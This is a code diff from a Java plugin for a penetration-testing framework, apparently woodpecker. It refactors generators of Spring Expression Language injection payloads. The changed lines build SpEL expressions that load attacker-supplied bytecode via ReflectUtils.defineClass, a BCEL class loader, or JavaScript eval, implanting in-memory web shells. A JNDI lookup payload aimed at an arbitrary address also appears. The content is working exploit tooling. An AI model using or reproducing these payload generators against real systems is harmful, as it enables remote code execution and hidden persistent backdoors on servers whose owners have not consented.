@@ -3,6 +3,7 @@ package me.gv7.woodpecker.plugin.exprs;
 import me.gv7.woodpecker.plugin.IExpr;
 import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
 import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
+import me.gv7.woodpecker.plugin.utils.SpELMemShellFactory;
 import me.gv7.woodpecker.plugin.utils.Utils;
 
 public class SpELExpr implements IExpr {
@@ -62,8 +63,8 @@ public class SpELExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
-                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out(genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
-                    "[+] BCEL方案：==>" + System.lineSeparator() + out(genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] BCEL方案：==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
                     "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
             };
@@ -79,13 +80,4 @@ public class SpELExpr implements IExpr {
         return new String[]{out("#{new javax.naming.InitialContext().lookup('" + jndiAddress + "')}")};
     }
 
-    private String genSpringMemShell1(byte[] memShellClass) throws Exception {
-        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BASE64);
-        return "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('" + classFactory.getClassName() + "',T(org.springframework.util.Base64Utils).decodeFromString('" + classFactory.getPayload() + "'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}";
-    }
-
-    private String genSpringMemShell2(byte[] memShellClass) throws Exception {
-        MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BCEL);
-        return "#{new com.sun.org.apache.bcel.internal.util.ClassLoader(new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).loadClass('" + classFactory.getPayload() + "').newInstance()}";
-    }
 }
